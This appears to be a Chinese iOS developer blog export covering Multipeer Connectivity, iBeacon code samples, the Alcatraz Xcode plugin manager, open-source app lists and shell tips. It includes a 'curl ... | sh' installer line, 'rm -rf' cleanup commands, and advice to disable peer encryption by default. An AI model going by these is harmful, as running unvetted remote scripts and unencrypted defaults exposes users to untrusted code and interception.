Connectivity框架进行数据交换之前需要经过两个阶段——发现阶段和会话阶段。在发现阶段，使用Multipeer Connectivity框架的应用会浏览或通知周围可供连接的设备以便自己可以加入设备间的数据交换中。此时，两个应用之间是不能交换数据的。\n当用户选择与某台设备连接在一起后，双方就进入了会话模式，这时它们将可以进行数据交互，比如，传送文字、图片等。\n开发流程用MultiPeerConnectivity进行通讯，如同三次握手的通讯类似，A先放出广播，B用于搜索！B搜到之后，会向A发送邀请，建立连接，当A接受了之后，A会向B发送一个会话(session)，若建立成功则可以互传数据！\nAdvertising &amp; Discovering通信的第一步是让大家互相知道彼此，我们通过广播(Advertising)和发现(discovering)服务来实现。\n广播作为服务器搜索附近的节点，而节点同时也去搜索附近的广播。在许多情况下，客户端同时广播并发现同一个服务，这将导致一些混乱，尤其是在client-server模式中。\n每一个服务都应有一个类型（标示符），它是由ASCII字母、数字和“-”组成的短文本串，最多15个字符。通常，一个服务的名字应该由应用程序的名字开始，后边跟“-”和一个独特的描述符号。(作者认为这和 com.apple.* 标示符很像)，就像下边：\nstatic NSString * const XXServiceType = @&quot;xx-service&quot;;\n\n一个节点有一个唯一标示MCPeerID对象，使用展示名称进行初始化，它可能是用户指定的昵称，或是单纯的设备名称。\nMCPeerID *localPeerID = [[MCPeerID alloc] initWithDisplayName:[[UIDevice currentDevice] name]];\n\nCreating a Session创建session，并在接受邀请连接时传递到节点。\nMCSession有两个初始化方式：\n- (instancetype)initWithPeer:(MCPeerID *)myPeerID- (instancetype)initWithPeer:(MCPeerID *)myPeerID securityIdentity:(NSArray *)identity encryptionPreference:(MCEncryptionPreference)encryptionPreference\n\nmyPeerID：本地节点标识符\nsecurityIdentity：可选参数。通过X.509证书，它允许节点安全识别并连接其他节点。\nencryptionPreference：指定是否加密节点之间的通信。MCEncryptionPreference枚举提供的三种值是:\nMCEncryptionOptional:会话更喜欢使用加密,但会接受未加密的连接。MCEncryptionRequired:会话需要加密。MCEncryptionNone:会话不应该加密。\n\n启用加密会显著降低传输速率，所以除非你的应用程序很特别，需要对用户敏感信息的处理，否则建议使用MCEncryptionNone。\nMCSession *session = [[MCSession alloc] initWithPeer:localPeerID securityIdentity:nil encryptionPreference:MCEncryptionNone];session.delegate = self;\n\nMCSessionDelegate协议将会在发送和接受信息的部分被覆盖。\nAdvertisingMCNearbyServiceAdvertiser服务的广播通过MCNearbyServiceAdvertiser来操作，初始化时带着本地节点、服务类型以及任何可与发现该服务的节点进行通信的可选信息。\nMCNearbyServiceAdvertiser *advertiser = [[MCNearbyServiceAdvertiser alloc] initWithPeer:localPeerID discoveryInfo:nil serviceType:XXServiceType];advertiser.delegate = self;[advertiser startAdvertisingPeer];\n\n相关事件由advertiser的代理来处理，需遵从MCNearbyServiceAdvertiserDelegate协议。\n// 广播失败- (void)advertiser:(MCNearbyServiceAdvertiser *)advertiser didNotStartAdvertisingPeer:(NSError *)error// 是否接受或拒绝传入连接请求，并有权以拒绝或屏蔽任何来自该节点的后续请求选项- (void)advertiser:(MCNearbyServiceAdvertiser *)advertiser didReceiveInvitationFromPeer:(MCPeerID *)peerID withContext:(NSData *)context invitationHandler:(void (^)(BOOL accept, MCSession *session))invitationHandler\n\nMCAdvertiserAssistant服务的广播通过MCAdvertiserAssistant来操作，初始化时带着服务类型以及Session信息。\nMCAdvertiserAssistant *advertiser = [[MCAdvertiserAssistant alloc]initWithServiceType:XXServiceType discoveryInfo:nil session:session];//开始广播[advertiser start];\n\nDiscovering客户端使用MCNearbyServiceBrowser来发现广播，它需要local peer标识符，以及非常类似MCNearbyServiceAdvertiser的服务类型来初始化：\nMCNearbyServiceBrowser *browser = [[MCNearbyServiceBrowser alloc] initWithPeer:localPeerID serviceType:XXServiceType];browser.delegate = self;// 开始发现[browser startBrowsingForPeers];\n\n可能会有很多节点广播一个特定的服务，所以为了方便用户（或开发者），MCBrowserViewController将提供一个内置的、标准的方式来呈现链接到广播节点：\nMCBrowserViewController *browserViewController =    [[MCBrowserViewController alloc] initWithBrowser:browser                                             session:session];browserViewController.delegate = self;[self presentViewController:browserViewController                   animated:YES                 completion:^&#123;    // 开始发现    [browser startBrowsingForPeers];&#125;];\n\n当browser完成节点连接后，它将使用它的delegate调用browserViewControllerDidFinish:，以通知展示视图控制器–它应该更新UI以适应新连接的客户端。\n#param mark - MCNearbyServiceBrowserDelegate// 发现服务错误- (void)browser:(MCNearbyServiceBrowser *)browser didNotStartBrowsingForPeers:(NSError *)error// 发现附近的广播者- (void)browser:(MCNearbyServiceBrowser *)browser foundPeer:(MCPeerID *)peerID withDiscoveryInfo:(NSDictionary&lt;NSString *,NSString *&gt; *)info// 附近的广播者停止广播- (void)browser:(MCNearbyServiceBrowser *)browser lostPeer:(MCPeerID *)peerID\n\n#param mark - MCBrowserViewControllerDelegate// 点击完成按钮- (void)browserViewControllerDidFinish:(MCBrowserViewController *)browserViewController// 点击取消按钮- (void)browserViewControllerWasCancelled:(MCBrowserViewController *)browserViewController\n\nSending &amp; Receiving Information一旦节点彼此相连，它们将能互传信息。Multipeer Connectivity框架区分三种不同形式的数据传输：\n\nMessages：定义明确的信息，比如端文本或者小序列化对象。\nStreams：可连续传输数据（如音频，视频或实时传感器事件）的信息公开渠道。\nResources：是图片、电影以及文档的文件。\n\nMessagesMessages使用-sendData:toPeers:withMode:error::方法发送。\nNSString *message = @&quot;Hello, World!&quot;;NSData *data = [message dataUsingEncoding:NSUTF8StringEncoding];NSError *error = nil;if (![self.session sendData:data                    toPeers:peers                   withMode:MCSessionSendDataReliable                      error:&amp;error]) &#123;    NSLog(@&quot;[Error] %@&quot;, error);&#125;\n\n通过MCSessionDelegate方法 -sessionDidReceiveData:fromPeer:收取信息。以下是如何解码先前示例代码中发送的消息：\n#pragma mark - MCSessionDelegate- (void)session:(MCSession *)session didReceiveData:(NSData *)data       fromPeer:(MCPeerID *)peerID&#123;    NSString *message =        [[NSString alloc] initWithData:data                              encoding:NSUTF8StringEncoding];    NSLog(@&quot;%@&quot;, message);&#125;\n\n另一种方法是发送NSKeyedArchiver编码的对象：\nid &lt;NSSecureCoding&gt; object = // ...;NSData *data = [NSKeyedArchiver archivedDataWithRootObject:object];NSError *error = nil;if (![self.session sendData:data                    toPeers:peers                   withMode:MCSessionSendDataReliable                      error:&amp;error]) &#123;    NSLog(@&quot;[Error] %@&quot;, error);&#125;#pragma mark - MCSessionDelegate- (void)session:(MCSession *)session didReceiveData:(NSData *)data       fromPeer:(MCPeerID *)peerID&#123;    NSKeyedUnarchiver *unarchiver = [[NSKeyedUnarchiver alloc] initForReadingWithData:data];    unarchiver.requiresSecureCoding = YES;    id object = [unarchiver decodeObject];    [unarchiver finishDecoding];    NSLog(@&quot;%@&quot;, object);&#125;\n\n为了防范对象替换攻击,设置requiresSecureCoding为YES是很重要的，这样如果根对象类没有遵从&lt;NSSecureCoding&gt;，就会抛出一个异常。\nStreamsStreams 使用 -startStreamWithName:toPeer:方法发送：\nNSOutputStream *outputStream =    [session startStreamWithName:name                          toPeer:peer];stream.delegate = self;[stream scheduleInRunLoop:[NSRunLoop mainRunLoop]                forMode:NSDefaultRunLoopMode];[stream open];// ...\n\nStreams通过MCSessionDelegate的方法session:didReceiveStream:withName:fromPeer:来接收：\n#pragma mark - MCSessionDelegate- (void)session:(MCSession *)sessiondidReceiveStream:(NSInputStream *)stream       withName:(NSString *)streamName       fromPeer:(MCPeerID *)peerID&#123;    stream.delegate = self;    [stream scheduleInRunLoop:[NSRunLoop mainRunLoop]                      forMode:NSDefaultRunLoopMode];    [stream open];&#125;\n\n输入和输出的streams必须安排好并打开，然后才能使用它们。一旦这样做，streams就可以被读出和写入。\nResourcesResources 发送使用 -sendResourceAtURL:withName:toPeer:withCompletionHandler::\nNSURL *fileURL = [NSURL fileURLWithPath:@&quot;path/to/resource&quot;];NSProgress *progress =    [self.session sendResourceAtURL:fileURL                           withName:[fileURL lastPathComponent]                             toPeer:peer                  withCompletionHandler:^(NSError *error)&#123;    NSLog(@&quot;[Error] %@&quot;, error);&#125;];\n\n返回的NSProgress对象可以是通过KVO(Key-Value Observed)来监视文件传输的进度，并且它提供取消传输的方法：-cancel。\n接收资源实现MCSessionDelegate两种方法：-session:didStartReceivingResourceWithName:fromPeer:withProgress: 和 -session:didFinishReceivingResourceWithName:fromPeer:atURL:withError:\n#pragma mark - MCSessionDelegate- (void)session:(MCSession *)sessiondidStartReceivingResourceWithName:(NSString *)resourceName       fromPeer:(MCPeerID *)peerID   withProgress:(NSProgress *)progress&#123;    // ...&#125;- (void)session:(MCSession *)sessiondidFinishReceivingResourceWithName:(NSString *)resourceName       fromPeer:(MCPeerID *)peerID          atURL:(NSURL *)localURL      withError:(NSError *)error&#123;    NSURL *destinationURL = [NSURL fileURLWithPath:@&quot;/path/to/destination&quot;];    NSError *error = nil;    if (![[NSFileManager defaultManager] moveItemAtURL:localURL                                                 toURL:destinationURL                                                 error:&amp;error]) &#123;        NSLog(@&quot;[Error] %@&quot;, error);    &#125;&#125;\n\n再次说明，在传输期间NSProgress parameter in -session:didStartReceivingResourceWithName:fromPeer:withProgress:允许接收节点来监控文件传输进度。在-session:didFinishReceivingResourceWithName:fromPeer:atURL:withError:中,delegate的责任是从临时localURL移动文件至永久位置。\nMultipeer是突破性的API，其价值才刚刚开始被理解。虽然完整的支持功能比如AirDrop目前仅限于最新的设备，你应该会看到它将成为让所有人盼望的功能。\n参考资料\nhttp://www.cocoachina.com/industry/20140408/8118.html\nhttps://www.objc.io/issues/18-games/multipeer-connectivity-for-games/\nhttp://blog.csdn.net/daiyibo123/article/details/48287079\nhttp://www.jianshu.com/p/84b479039797\nhttp://www.jianshu.com/p/d1401793eeea\n\niBeaconiBeacon概述维基百科定义\n\niBeacon是apple公司提出的“一种可以让附近手持电子设备检测到的一种新的低功耗、低成本信号传送器”的一套可用于室内定位系统的协议。这种技术可以使一个智能手机或其他装置在一个iBeacon基站的感应范围内执行相应的命令。\n这是帮助智能手机确定他们大概位置或环境的一个应用程序。在一个iBeacon基站的帮助下，智能手机的软件能大概找到它和这个iBeacon基站的相对位置。iBeacon能让手机收到附近售卖商品的通知，也可以让消费者不用拿出钱包或信用卡就能在销售点的POS机上完成支付。iBeacon技术通过低功耗蓝牙（BLE），也就是我们所说的智能蓝牙来实现。\niBeacon为利用低功耗蓝牙可以近距离感测的功能来传输通用唯一识别码的一个app或操作系统。这个识别码可以在网上被查找到用以确定设备的物理位置或者可以在设备上触发一个动作比如在社交媒体签到或者推送通知。\n\niBeacon 是苹果公司在 iOS 7 中新推出的一种近场定位技术，可以感知一个附近的 iBeacon 信标的存在。当一个 iBeacon 兼容设备进入&#x2F;退出一个 iBeacon 信标标识的区域时，iOS 和支持 iBeacon 的 app 就能得知这一信息，从而对用户发出相应的通知。\n典型的应用场景例如博物馆实时推送附近展品的相关信息，商场内即时通知客户折扣信息等。苹果在 Apple Store 中也部署了 iBeacon 来推送优惠、活动信息。\n特点iBeacon 基于低功耗蓝牙技术（Bluetooth Low Energy, BLE）这一开放标准，因此也继承了 BLE 的一些特点。\n\n范围广\n相比于 NFC 的数厘米的识别范围，iBeacon 的识别范围可以达到数十米，并且能够估计距离的远近。\n\n兼容性\niBeacon 是基于 BLE 做的一个简单封装，因此大部分支持 BLE 的设备都可以兼容。例如可以使用一个普通的蓝牙芯片作为信标，使用 Android 设备检测信标的存在。\n\n低能耗\n不少 beacon 实现宣称可以不依赖外部能源独立运行两年。\n\n\n使用场景我们以一个连锁商场的例子来讲解 iBeacon 的一个流程。在一个连锁商场中，店家需要在商场中的不同地方推送不同的优惠信息，比如服装和家居柜台推送的消息就很有可能不同。\n当消费者走进某个商场时，会扫描到一个 beacon。这个 beacon 有三个标志符，proximityUUID 是一个整个公司（所有连锁商场）统一的值，可以用来标识这个公司，major 值用来标识特定的连锁商场，比如消费者正在走进的商场，minor 值标识了特定的一个位置的 beacon，例如定位到消费者正在门口。\n这时商场的 app 会被系统唤醒，app 可以运行一个比较短的时间。在这段时间内，app 可以根据 beacon 的属性查询到用户的地理位置（通过查询服务器或者本地数据），例如在化妆品专柜，之后就可以通过一个 local notification 推送化妆品的促销信息。用户可以点击这次 local notification 来查看更详细的信息，这样一次促销行为就完成了。\niBeacon使用使用iBeacon需要添加2个库的支持，CoreLocation.framework、CoreBluetooth.framework\n#import &lt;CoreLocation/CoreLocation.h&gt;#import &lt;CoreBluetooth/CoreBluetooth.h&gt;\n\n宏定义\n#define UUID @&quot;E2C56DB5-DFFB-48D2-B060-D0F5A71096E4&quot;#define IDENTIFIER [NSBundle mainBundle].bundleIdentifier\n\n成员变量\n//建立iBeacon服务端，只负责发送出去数据CLBeaconRegion * serverBeaconRegion;CBPeripheralManager * peripheralMsg;//建立iBeacon客户端,只负责接收数据CLLocationManager * locationManager;CLBeaconRegion * findBeaconRegion;//对于商场应用，我们多数可能只需要客户端，而不一定需要服务端//我们还需要字典，记录发送端的返回数据NSMutableDictionary * regionData;\n\n使用 iOS 设备作为 iBeacon// 服务端设置主频和副频 unsigned short最大数不超过65535//主频(最有效值)CLBeaconMajorValue major=1430;//副频(最低有效值)CLBeaconMinorValue minor= 1000;//创建UUIDNSUUID * user = [[NSUUID alloc]initWithUUIDString:UUID];//创建发现信息serverBeaconRegion = [[CLBeaconRegion alloc]initWithProximityUUID:user major:major minor:minor identifier:IDENTIFIER];//发现信息计算成字典regionData = [serverBeaconRegion peripheralDataWithMeasuredPower:nil];//创建服务peripheralMsg = [[CBPeripheralManager alloc]initWithDelegate:self queue:dispatch_get_main_queue()];\n\n#pragma mark - CBPeripheralManagerDelegate-(void)peripheralManagerDidUpdateState:(CBPeripheralManager *)peripheral&#123;    //检测状态    if (peripheral.state==CBPeripheralManagerStatePoweredOn) &#123;        //可以开始        [peripheral startAdvertising:regionData];    &#125;else&#123;        if (peripheral.state==CBPeripheralManagerStatePoweredOff) &#123;            //关闭            [peripheral stopAdvertising];        &#125;    &#125;&#125;\n\n使用 iOS 设备发现 iBeacon不用设置主频和副频，需要设置UUID\nNSUUID *user = [[NSUUID alloc]initWithUUIDString:UUID];//注意这里初始化和服务端的初始化有所区别findBeaconRegion = [[CLBeaconRegion alloc]initWithProximityUUID:user identifier:IDENTIFIER];locationManager = [[CLLocationManager alloc]init];locationManager.delegate=self;// NSLocationAlwaysUsageDescription// 请求用户定位权限[locationManager requestAlwaysAuthorization];//开启搜索[locationManager startRangingBeaconsInRegion:findBeaconRegion];[locationManager startMonitoringForRegion:findBeaconRegion];[locationManager requestStateForRegion:findBeaconRegion];\n\n#pragma mark - CLLocationManagerDelegate// 用户定位授权回调- (void)locationManager:(CLLocationManager *)manager didChangeAuthorizationStatus:(CLAuthorizationStatus)status&#123;    if (status == kCLAuthorizationStatusAuthorizedAlways) &#123;        //开启iBeacon搜索        [manager startRangingBeaconsInRegion:findBeaconRegion];        [manager startMonitoringForRegion:findBeaconRegion];        [manager requestStateForRegion:findBeaconRegion];    &#125;&#125;// 近距离回调-(void)locationManager:(CLLocationManager *)manager didDetermineState:(CLRegionState)state forRegion:(CLRegion *)region&#123;    //近距离回调，有三个状态，三个状态分别在我们距离1米以内的时候触发    if (state==CLRegionStateInside) &#123;        //在1米以内    &#125;else&#123;        if (state==CLRegionStateOutside) &#123;            //在1米以外        &#125;else&#123;            //不知道CLRegionStateUnknown;        &#125;    &#125;&#125;-(void)locationManager:(CLLocationManager *)manager didEnterRegion:(CLRegion *)region&#123;    //该方法在推出后台，并且锁屏情况下依然可以触发，我们可以设置当我们进入后台时候，设置本地推送来提示用户进入一个范围即可    //判断是否在后台    UIApplicationState back=[UIApplication sharedApplication].applicationState;    if (back==UIApplicationStateBackground) &#123;        //在后台，我们需要执行推送告知用户        UILocalNotification*local=[[UILocalNotification alloc]init];        //设置时间        local.fireDate=[NSDate date];        //设置文字        local.alertBody=@&quot;我们进入一个店铺&quot;;        //加入推送        [[UIApplication sharedApplication]scheduleLocalNotification:local];    &#125;    NSLog(@&quot;进入了一个iBeacon，欢迎光临&quot;);&#125;-(void)locationManager:(CLLocationManager *)manager didExitRegion:(CLRegion *)region&#123;    NSLog(@&quot;离开了一个iBeacon，欢迎再次光临&quot;);&#125;-(void)locationManager:(CLLocationManager *)manager didRangeBeacons:(NSArray *)beacons inRegion:(CLBeaconRegion *)region&#123;    //扫描结果    NSLog(@&quot;扫描结果，该函数会一直调用&quot;);    for (int i=0; i&lt;beacons.count; i++) &#123;        //读取灯塔        CLBeacon*beacon=beacons[i];        //其中的数据转换为字符串        NSString*message= [self beaconValue:beacon];        NSLog(@&quot;beacon~~~%@&quot;,message);        //设置复用过程        UITextView*textView=(UITextView*)[self.view viewWithTag:beacon.minor.integerValue];        if (textView) &#123;            textView.text=message;        &#125;else&#123;            //创建            textView=[[UITextView alloc]initWithFrame:CGRectMake(num%3*110, num/3*200+64, 100, 190)];            textView.backgroundColor=[UIColor blackColor];            textView.textColor=[UIColor whiteColor];            //复用的关键            textView.tag=beacon.minor.integerValue;            [self.view addSubview:textView];            //设置num+1            num=num+1;            textView.text=message;        &#125;    &#125;&#125;-(NSString*)beaconValue:(CLBeacon*)beacon&#123;    //获取主频和副频    NSString*major=beacon.major.stringValue;    NSString*minor=beacon.minor.stringValue;    //获取距离    NSString*acc=[NSString stringWithFormat:@&quot;%lf&quot;,beacon.accuracy];    //获取感知，当距离非常近的时候告诉我接近程度 proximity是一个枚举    NSString*px=[NSString stringWithFormat:@&quot;%ld&quot;,beacon.proximity];    //信号强度    NSString*rssi=[NSString stringWithFormat:@&quot;%ld&quot;,beacon.rssi];    //组装字符串    NSString*message=[NSString stringWithFormat:@&quot;主频~%@\\n副频~%@\\n距离~%@\\n感知~%@\\n信号强度~%@\\n&quot;,major,minor,acc,px,rssi];    return message;&#125;-(void)locationManager:(CLLocationManager *)manager rangingBeaconsDidFailForRegion:(CLBeaconRegion *)region withError:(NSError *)error&#123;    NSLog(@&quot;扫描失败&quot;);    //当扫描启动失败以后，也就是用户没有开启蓝牙导致的失败，我们需要提示用户如何打开iBeacon，这个过程其实是诱导用户打开，判断是否在后台如果在后台就不进行任何操作了    //该功能在iOS7下的各个版本表现不一样，iOS7.0时候启动失败，就算打开蓝牙开关也无效，只能通过重启手机办法才可以做到，iOS7.1.2的时候，苹果明确说明了特意修复了该功能，但是实际表现结果依然差劲，还是需要重启解决，但是这个说明在上线时候，苹果对审核的时候，也表示可以理解，并在会发一封致歉信给苹果开发者&#125;\n\n\n\n参考资料\nhttps://zh.wikipedia.org/wiki/IBeacon\nhttps://developer.apple.com/ibeacon/\nhttps://github.com/nixzhu/dev-blog/blob/master/2014-04-23-ios7-ibeacons-tutorial.md\nhttp://tech.meituan.com/iBeacaon-first-glance.html\nhttp://www.jianshu.com/p/7816b016ceac\n\nDemo 下载https://github.com/xwal/Demo/tree/master/Bluetooth\n","categories":["iOS"],"tags":["Bluetooth","BLE","MultipeerConnectivity","iBeacon"]},{"title":"Alcatraz：Xcode 插件管理","url":"/2016/04/05/Alcatraz/","content":"简介Alcatraz 是一个帮你管理 Xcode 插件、模版以及颜色配置的工具。\n官网：http://alcatraz.io\nGitHub：https://github.com/alcatraz/Alcatraz\n\n\n安装在终端中执行如下命令：\ncurl -fsSL https://raw.githubusercontent.com/supermarin/Alcatraz/deploy/Scripts/install.sh | sh\n\nAlcatraz 只支持 Xcode 7+。\n使用从Window菜单中选择Package Manager，即可启动插件列表页面。安装完插件或者模板后，需要重启Xcode。\n卸载删除Alcatraz：\nrm -rf ~/Library/Application\\ Support/Developer/Shared/Xcode/Plug-ins/Alcatraz.xcplugin\n\n删除所有缓存数据：\nrm -rf ~/Library/Application\\ Support/Alcatraz\n\n插件路径Xcode 所有的插件都安装在目录：\n~/Library/Application\\ Support/Developer/Shared/Xcode/Plug-ins/\n\n你也可以手工切换到这个目录来删除插件。\nXcode 6.x 安装插件find ~/Library/Application\\ Support/Developer/Shared/Xcode/Plug-ins -name Info.plist -maxdepth 3 | xargs -I&#123;&#125; defaults write &#123;&#125; DVTPlugInCompatibilityUUIDs -array-add `defaults read /Applications/Xcode.app/Contents/Info DVTPlugInCompatibilityUUID`sudo xcode-select --reset\n\n常用插件\nAMMethod2Implement：可以自动的将.h或者.m .mm里边需要写入的方法自动填充进来。可以选择要导入的方法，然后按 Ctrl+A 或者 Edit &gt; AMMethod2Implement &gt; Implement Method.就会自动填充方法。也可以自行设置快捷键。\n\n\nAuto-Importer：快速导入头文件，快捷键：⌘ + ctrl + H\n\n\nClangFormat：自动调整代码风格\n\n\nCocoaPods：在Xcode通过pods安装各种objective-c第三方库，省去以前还要手动去跑pods命令行的麻烦；此外，还支持通过cocoaDocs来安装库文档。\n\n\nESJsonFormat：将JSON格式化输出为模型的属性\n\n\nFuzzyAutocomplete：代码自动补全\n\n\nKSHObjcUML：类引用关系图的Xcode\n\n\nKSImageNamed：为项目中使用的UIImage的imageNamed提供文件名自动补全功能。\n\n\nOMColorSense：颜色显示\n\nRTImageAssets：根据@3x的图片资源自动生成对应的@2x和@1x图片；自动生成App Icons，需要提供1024x1024的大图\n\n\n\nSCXcodeSwitchExpander：自动在switch的case中填写枚举值\n\n\nVVDocumenter-Xcode：规范化的注释，输入三个斜线“&#x2F;&#x2F;&#x2F;”。\n\n\nLin：本地化字符串\n\n\nXAlign：对齐常规代码\n\n\nXToDo：查找项目中所有带TODO、???、!!!等标记的地方，防止遗忘掉需要做的事情或者是代码中还存在bug的地方的插件\n\n\nXcodeBoost：包含多个辅助修改代码的小功能\n\n\nHOStringSense：大段文本利器\n\n\nPeckham：自动补全，快捷键⌘ + ctrl + P\n\n\nBBUDebuggerTuckAway：自动隐藏控制台\n\n\nInjectionPlugin：不用重新编译运行项目，可以动态调试App\n\n\nJSPatchX：JSPatch XCode 代码自动补全插件。\n\n\nAMLocalizedStringBuilder：AMLocalizedStringBuilder 是可以帮助你将语言本地化文件Localizable.strings生成object-c的类AMLocalizedString的Xcode插件，这样可以直接使用R_String.am_&lt;#你的本地化字符串key#&gt;获取对应key的值，还可以随时点击Alt或Option按键查看当前字符串的值。\n\nR.swift：类似AMLocalizedStringBuilder，不过是swift版本的，功能也更丰富，不仅支持Localized strings映射，还支持其他资源的映射。  \n\nFKRealGroup：创建真实目录  \n\nFastStub-Xcode：快速生成代码  \n\nSCXcodeMinimap：这个插件和Sublime Text中的那个看起来像。它能够显示一个编辑器的缩略图，轻松地查看、滚动代码。\n\nRevealPlugin：如果你使用Reveal的话，这个插件能快速启动Reveal。\n\nRealmPlugin：Realm的模型对象的模板文件。\n\n\n手动安装\n\n更新 Xcode 插件的 UUIDs安装$ gem install update_xcode_plugins\n\n使用$ update_xcode_plugins\n\n","categories":["iOS"],"tags":["Tools","Xcode 插件"]},{"title":"iOS完整项目示例仓库","url":"/2016/04/12/iOS-Project-List/","content":"程序员要提高自己的编程能力，有两个捷径：一、多写代码不断做个人项目；二、多看多学习别人的代码，看代码要比写代码难很多倍。\n\n\nObjective-C开源中国项目地址http://git.oschina.net/oschina/iphone-app\n项目简介OSCHINA 的 iPhone 客户端源码，可直接在 App Store上搜索“开源中国”来安装此app\nGit@OSC客户端项目地址http://git.oschina.net/oschina/git-osc-iphone\n项目简介Git@OSC iPhone 客户端，方便用户查看Git@OSC的项目以及简单的操作issue等。\nCoding客户端项目地址https://coding.net/u/coding/p/Coding-iOS/git\n项目简介Coding iOS 客户端源代码。\n\n房主儿项目地址https://coding.net/u/chaosky/p/Fangzhur/git\n项目简介找房、租房App。\nLeagueofLegends项目地址https://coding.net/u/chaosky/p/LeagueofLegends/git\n项目简介an iOS App for LeagueofLegends。\nphphub项目地址https://github.com/Aufree/phphub-ios\n项目简介PHPHub for iOS 是 PHPHub 的官方 iOS 客户端, 同时兼容 iPhone 和 iPad, 使用了最新的 PHPHub API, 目前该 API 仍在完善中, 待完全稳定之后会开放给所有开发者使用, 敬请期待. 若您在使用此应用的过程中有发现任何问题, 请到 GitHub 上给我提 issue 或 PR, 我将会不定期抽出时间来对一些 Bug 进行修复或更新。\n\n懒人笔记项目地址https://github.com/liaojinxing/Voice2Note\n项目简介懒人笔记是一款为懒人设计的笔记本，你只需要通过语音输入，即可完成笔记的书写。同时支持发邮件，分享到朋友圈等附加功能。大部分情况下你无需动笔，只需要靠说，就可以轻松记笔记、发邮件，是提高效率的好工具。\n\n豆瓣妹子项目地址https://github.com/Sunnyyoung/Meizi\n项目简介豆瓣妹子图iOS客户端。\n\nChatSecure项目地址https://github.com/ChatSecure/ChatSecure-iOS\n项目简介ChatSecure is a free and open source instant messaging client for iOS and Android that integrates encrypted OTR (“Off the Record”) messaging support from the libotr library and the XMPPFramework to handle Jabber&#x2F;GTalk (XMPP).\n高仿知乎日报项目地址https://github.com/zpz1237/NirZhihuDaily2.0\n项目简介精仿知乎日报iOS端.\n\n维基百科官方App项目地址https://github.com/wikimedia/wikipedia-ios\n项目简介The official Wikipedia iOS app.\n高仿美团项目地址https://github.com/lookingstars/meituan\n项目简介高仿美团iOS版。\n高仿糯米项目地址https://github.com/lookingstars/nuomi\n项目简介高仿百度糯米iOS版\nOpen-Source iOS Apps列表项目地址https://github.com/dkhamsing/open-source-ios-apps\n动画练习项目项目地址https://github.com/MartinRGB/LearnCube-iOS\nGitBucket iOS App项目地址https://github.com/leichunfeng/MVVMReactiveCocoa\nMonkey：Github第三方客户端项目地址https://github.com/coderyi/Monkey\n项目简介Monkey is a GitHub third party client for iOS,to show the rank of coders and repositories.\n\nDesignerNews项目地址https://github.com/MengTo/DesignerNewsApp\n项目简介Simple iOS client for Designer News, by the creator of Design+Code and the team, written in Swift.\n\nV2EX项目地址https://github.com/singro/v2ex\n项目简介An iOS client for v2ex.com\n\nSwift高仿堆糖项目地址https://github.com/cornerAnt/PilesSugar\n项目简介\nSymphony项目地址https://github.com/b3log/symphony-ios\n项目简介\nUberGuide项目地址https://github.com/hACKbUSTER/UberGuide-iOS\n项目简介It’s the project we did for Uber Hackathon China 2016. This is the repo for iOS client. Using swift and Objective-C.\nThe project code is ‘UberGuide’, but since the product name can not contain anything related with Uber, so we name it ‘Smart Traveller’.\n\nV2EX项目地址https://github.com/liaojinxing/V2EXClient\n项目简介Swift实现的V2EX iOS客户端。\n\niOS Swift Demos项目地址https://github.com/Lax/iOS-Swift-Demos\n项目简介精心收集并分类整理的Swift开发学习资源，包括Apple官方提供的示例代码和文档，以及github上的项目和国内外开发者的技术博客。\ntry! Swift Conference App项目地址https://github.com/tryswift/trySwiftApp\n项目简介try! Swift Conference App。\n逗视项目地址https://github.com/doushiDev/ds_ios\n项目简介在这一个高速运转的社会中,大家真的太忙了,没有了欢笑,没有了生活！但是我们生活中不能缺少欢乐，搞笑！那么，逗视来了！！ 你可以在逗视中看到海量的搞笑，恶搞的精彩视频，秒拍，美拍等热门视频。逗视首页分类包括推荐，精华，热门等满足更多人的需求！逗视在发现页面有排行榜功能，看看哪些视频大家都在看！逗视中的视频可以分享到QQ，微信，微博等社交平台，与你的朋友一起欢乐！ 逗视可以说是搞笑视频全聚合！！！一定会让你爱不离手的！！让我们回到以前的自己，天天高高兴兴，让我们开怀大笑吧！！！支持3DTouch 手势，快捷菜单：我的收藏，排行榜\n\nV2ex-Swift项目地址https://github.com/Finb/V2ex-Swift\n项目简介An iOS client written in Swift for V2EX.\n\nYep项目地址https://github.com/CatchChat/Yep\n项目简介A community where geniuses meet\n\nFlappy Bird项目地址https://github.com/fullstackio/FlappySwift\n项目简介An implementation of Flappy Bird in Swift for iOS 8.\n\nSwift Weather项目地址https://github.com/JakeLin/SwiftWeather\n项目简介SwiftWeather is an iOS weather app developed in Swift 2. The app has been actively upgrading to adopt the latest features of iOS and Swift language.\n\nHacker News项目地址https://github.com/amitburst/HackerNews\n项目简介A Hacker News reader iOS app written in Swift.\n\n2048项目地址https://github.com/austinzheng/swift-2048\nStick Hero项目地址https://github.com/phpmaple/Stick-Hero-Swift\n","categories":["iOS"],"tags":["完整项目","Objective-C","Swift"]},{"title":"命令行工具使用技巧","url":"/2016/04/30/Command-Line-Tools/","content":"只显示子目录、不显示文件，可以使用下面的命令。# 只显示常规目录$ ls -d */$ ls -F | grep /$ ls -l | grep ^d$ tree -dL 1# 只显示隐藏目录$ ls -d .*/# 隐藏目录和非隐藏目录都显示$ find -maxdepth 1 -type d\n\n来自runyf\n\nGit常用命令速查表\n\n来自Coding\n\n清除DNS缓存命令sudo dscacheutil -flushcachesudo killall -HUP mDNSResponder\n\n批量重命名文件以下命令将文件名中包含~iphone的文字替换为空字符\nfor i in `ls`; do mv -f $i `echo $i | sed &#x27;s/~iphone//g&#x27;`; done\n\nGit 删除 一个 submodule\n删除 .gitmodules 文件中关联内容；\n执行 git add .gitmodules\n删除 .git/config 文件中关联内容；\n执行 git rm --cached path_to_submodule（不包含尾部斜线）\n执行 rm -rf .git/modules/path_to_submodule\n提交 git commit -m &quot;Removed submodule &lt;name&gt;&quot;\n删除子模块文件 rm -rf path_to_submodule\n\nChanging remote repository for a git submoduleYou should just be able to edit the .gitmodules file to update the URL and then run git submodule sync to reflect that change to the superproject and your working copy.\ngit config --file=.gitmodules submodule.Submod.url https://github.com/username/ABC.gitgit config --file=.gitmodules submodule.Submod.branch Developmentgit submodule syncgit submodule update --init --recursive --remote\n\n参考链接：http://stackoverflow.com/questions/913701/changing-remote-repository-for-a-git-submodule\n显示磁盘使用空间du -sh *\n","categories":["Linux"],"tags":["Tools"]},{"title":"iOS Tips","url":"/2016/05/26/iOS-Tips/","content":"工具类提取assets.car中的图片ThemeEngine：Mac下的Assets.car文件查看工具，能够将图片导入到PhotoShop中进行编辑，提供了导出图片的功能。ThemeEngine拥有命令行版和图形界面版。使用私有APICoreUI开发。 